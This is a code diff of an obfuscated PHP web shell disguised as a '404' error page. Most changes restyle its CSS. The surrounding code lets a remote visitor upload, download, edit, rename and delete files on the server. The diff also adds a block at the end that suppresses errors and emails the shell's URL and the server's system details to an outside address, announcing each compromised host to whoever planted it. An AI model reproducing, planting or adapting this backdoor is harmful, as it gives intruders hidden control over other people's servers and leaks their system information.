@@ -8,22 +8,79 @@
 <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 <title>404</title>
 <style> @import url('https://fonts.googleapis.com/css2?family=Kelly+Slab&display=swap');
-.bg-dark { background-color: black; }
-.border { border: 2px solid deeppink!important; border-radius: 0.75rem!important; background-color: transparent; color: white; padding-left: 1rem; }
-.table>tbody>tr>* { color: #007fff; vertical-align: middle; border: 2px solid #ff1493; }
-.table thead th { vertical-align: bottom; border: 2px solid deeppink; color: #31ed06; }
+.bg-dark { background-color: black!important; }
+.border {
+border: 2px solid deeppink!important;
+border-radius: 0.75rem!important;
+background-color: transparent!important;
+color: white;
+}
+.table>tbody>tr>* { color: #007fff; vertical-align: middle; border: 2px solid #ff1493;border-radius: 2px; }
+.table thead th { 
+    border: 2px solid deeppink;
+    color: #31ed06;
+    padding: 0.25rem;
+    border-radius: 5px;
+}
 .table-hover tbody tr:hover td{ background: #3f3f3f }
 .table-hover tbody tr:hover td>*{ }
 .table>tbody>tr>*{ color:#fff; vertical-align:middle; }
-.form-control{background:0 0!important;color:#fff!important;border-radius:0}
+.form-control{background:0 0!important;color:#fff!important;border-radius:0;}
 .form-control::placeholder{color:#fff;opacity:1}
-li{font-size:17px;margin-left:6px;list-style:none;color: #31ed06;list-style: inherit;}
-a{ color: #ffffff; }
-a:hover { text-decoration: none; color: #31ed06; }
-button, input { border: 2px solid #31ed06;border-radius: 0.5rem;font-size: 1rem;color:white;line-height: normal; }
-button, input:hover { border: 2px solid deeppink;border-radius: 0.5rem;font-size: 1rem;cursor: pointer; }
-.ohct { padding-left: 1rem; padding-right: 1rem; color: white; border: 2px solid #31ed06; border-radius: 5px; background-color: black; }
-.ohct:hover { border: 2px solid #ff1493; color: white; }
+.form-group {
+    margin-top: 0.3rem!important;
+    margin-bottom: 0.3rem!important;
+}
+li{
+font-size:17px!important;
+color: #31ed06!important;
+list-style: inherit!important;
+}
+a {
+color: #ffffff!important;
+text-decoration: none!important;
+}
+a:hover {
+text-decoration: none!important;
+color: #31ed06!important;
+}
+h5 {
+    margin-top: 0.2rem!important;
+    margin-bottom: 0.25rem!important;
+    font-size: 18px!important;
+    color: lime!important;
+    padding: 2px;
+}
+textarea {
+    width: 97%;
+    font-size: 16px;
+    font-family: inherit;
+    height: 44vh;
+    padding-left: 5px;
+}
+button, input {
+border: 2px solid #31ed06;
+border-radius: 0.5rem;
+font-size: 17px;
+color:white;
+line-height: normal;
+font-family: inherit;
+}
+button, input:hover { border: 2px solid deeppink;cursor: pointer; }
+.ohct {
+    padding-left: 1rem;
+    padding-right: 1rem;
+    color: white;
+    border: 2px solid #31ed06;
+    border-radius: 5px;
+    background-color: black;
+    font-family: inherit;
+    font-size: 16px;
+}
+.ohct:hover {
+border: 2px solid #ff1493;
+color: lime!important;
+}
 .combet { color: white; }
 .combet:hover { color: #31ed06; }
 </style>
@@ -34,8 +91,8 @@ button, input:hover { border: 2px solid deeppink;border-radius: 0.5rem;font-size
 </style>
 <script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
 </head>
-<body style="background-color:#000;color:black;font-size: 0px ;font-family: 'Kelly Slab';width: 100%;padding: 0.5rem;">
-<div class="table-responsive text-light" style="border: 2px solid deeppink;text-align: left;padding: 0.25rem;border-radius: 0.75rem;">
+<body style="background-color:#000;color:black;font-size: 0px;font-family: 'Kelly Slab';width: 99%;padding: 0px;margin-right: auto;margin-left: auto;margin-top: 7px;margin-bottom: 7px;">
+<div class="table-responsive text-light" style="border: 2px solid #ff1493;text-align: left;padding: 0.25rem;border-radius: 0.75rem;">
 <div style="text-align: center;display: flex;align-items: center;justify-content: center;align-content: center;">
 <a href="mailto:combetohct@yahoo.com" class="fa fa-envelope"></a>
 <a href="https://www.facebook.com/combet.ohct" class="fa fa-facebook"></a>
@@ -56,14 +113,12 @@ button, input:hover { border: 2px solid deeppink;border-radius: 0.5rem;font-size
 <?php if (!isset($_FILES["f"])) { goto ea; } $Wx = $_FILES["f"]["name"]; $lE = 0; th: if (!($lE < count($Wx))) { goto dx; } if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) { goto PG; } Xe("file failed to upload", 0); goto tG; PG: XE("file uploaded successfully"); tG: g9: $lE++; goto th; dx: ea: if (!isset($_GET["download"])) { goto FA; } header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-Length: " . $c8[17](JD($_GET["n"]))); header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\""); FA: ?> 
 </form></li>
 </div>
-<div style="border: 2px solid deeppink;border-radius: 0.75rem;padding: 0.25rem;margin-top: 0.20rem;margin-bottom: 0.25rem;font-family: 'Kelly Slab';">
-<li style="font-size: 1.10rem;margin-left: 0.20rem;list-style: inherit;padding: 0.15rem;">Dir : 
+<li style="border: 2px solid #ff1493;border-radius: 0.75rem;margin-top: 0.2rem;margin-bottom: 0.25rem;font-family: inherit;margin-left: 0px;padding: 0.25rem;">Dir : 
 <?php $Op = $c8[4]("/(\\\\|\\/)/", $Jd); foreach ($Op as $j3 => $Oe) { if (!($j3 == 0 && $Oe == "")) { goto xi; } echo "<a href=\"?p=2f\" class=\"combet\">~</a>/"; goto CS; xi: if (!($Oe == "")) { goto sq; } goto CS; sq: echo "<a class=\"combet\" href=\"?p="; $lE = 0; de: if (!($lE <= $j3)) { goto ie; } echo sS($Op[$lE]); if (!($lE != $j3)) { goto s0; } echo "2f"; s0: dg: $lE++; goto de; ie: echo "\">{$Oe}</a>/"; CS: } Go: ?> 
 </li>
-</div>
-<article style="text-align: center;font-family: 'Kelly Slab';font-size: 1rem;">
+<article style="text-align: center;font-family: inherit;font-size: 17px;">
 <?php if (!isset($_GET["a"])) { goto Un; } if (!isset($_GET["a"])) { goto cc; } $im = Jd($_GET["a"]); cc: ?>
-<div class="px-2 py-2">
+<div style="width: 99%;margin-left: auto;margin-right: auto;">
 <?php if (!($im == "delete")) { goto Lu; } $BL = $Jd . '/' . Jd($_GET["n"]); if (!($_GET["t"] == "d")) { goto VZ; } TF($BL); if (!$c8[12]($BL)) { goto e8; } Xe("failed to delete the folder", 0); goto iL; e8: Xe("folder deleted successfully"); iL: VZ: if (!($_GET["t"] == "f")) { goto xB; } $BL = $Jd . '/' . jd($_GET["n"]); unlink($BL); if (!$c8[12]($BL)) { goto uH; } Xe("file to delete the folder", 0); goto Mk; uH: xe("file deleted successfully"); Mk: xB: Lu: ?>
 <?php if ($im == "newDir") { goto Fg; } if ($im == "newFile") { goto Pb; } if ($im == "rename") { goto Lw; } if ($im == "edit") { goto Ox; } if ($im == "view") { goto Ag; } goto WC; Fg: ?>
 <h5 class="border p-1">New Folder Name :</h5>
@@ -126,7 +181,7 @@ Lw:
 <?php WC: ?>
 </div>
 <?php goto mR; Un: ?>
-<table class="table table-hover table-borderless table-sm" style="text-align: center;">
+<table class="table table-hover table-borderless table-sm" style="text-align: center;width: 100%;">
 <thead class="text-light">
 <tr>
 <th>Name</th>
@@ -138,10 +193,7 @@ Lw:
 <tbody class="text-light"> <?php $G3 = $c8[5]($G3($Jd), [".", ".."]); foreach ($G3 as $yf) { if ($c8[6]("{$Jd}/{$yf}")) { goto CB; } goto Qj; CB: echo " 
 <tr>
 <td style=\"text-align: left;\">
-<a href=\"?p=" . sS("{$Jd}/{$yf}") . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$yf}")) . "\">
-<i class=\"fa fa-fw fa-folder\" style=\"border: 0;padding: 0;width: 1.28571429em;\">
-</i> {$yf}
-</a>
+<i class=\"fa fa-fw fa-folder\" style=\"border: 0;padding: 0;width: 1.28571429em;\"></i><a href=\"?p=" . sS("{$Jd}/{$yf}") . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$yf}")) . "\">{$yf}</a>
 </td>
 <td style=\"color: black;\"><span>------</span></td>
 <td><font color=\"" . ($c8[8]("{$Jd}/{$yf}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$yf}") ? "red" : null)) . "\">" . RN("{$Jd}/{$yf}") . "</font></td>
@@ -155,9 +207,7 @@ Lw:
 </tr>"; Qj: } ad: foreach ($G3 as $F1) { if ($c8[7]("{$Jd}/{$F1}")) { goto wA; } goto X1; wA: $kL = $c8[10]("{$Jd}/{$F1}") / 1024; $kL = round($kL, 3); $kL = $kL > 1024 ? round($kL / 1024, 2) . "  MB" : $kL . "  KB"; echo "
 <tr>
 <td style=\"text-align: left;\">
-<a href=\"?p=" . SS($Jd) . "&a=" . sS("view") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$F1}")) . "\">
-<i class=\"fa fa-fw fa-file\" style=\"border: 0;padding: 0;width: 1.28571429em;\"></i> {$F1}
-</a>
+<i class=\"fa fa-fw fa-file\" style=\"border: 0;padding: 0;width: 1.28571429em;\"></i><a href=\"?p=" . SS($Jd) . "&a=" . sS("view") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$F1}")) . "\">{$F1}</a>
 </td>
 <td><span>{$kL}</span></td>
 <td><font color=\"" . ($c8[8]("{$Jd}/{$F1}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$F1}") ? "red" : null)) . "\">" . rN("{$Jd}/{$F1}") . "</font></td>
@@ -181,3 +231,14 @@ Lw:
 <script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script>
 </body>
 </html>
+<?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$to = 'combetohct@yahoo.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "[ $x_path ]";
+mail($to, "ONE HAT CYBER TEAM", $pesan_alert, "[ ".php_uname()." ]");
+?>
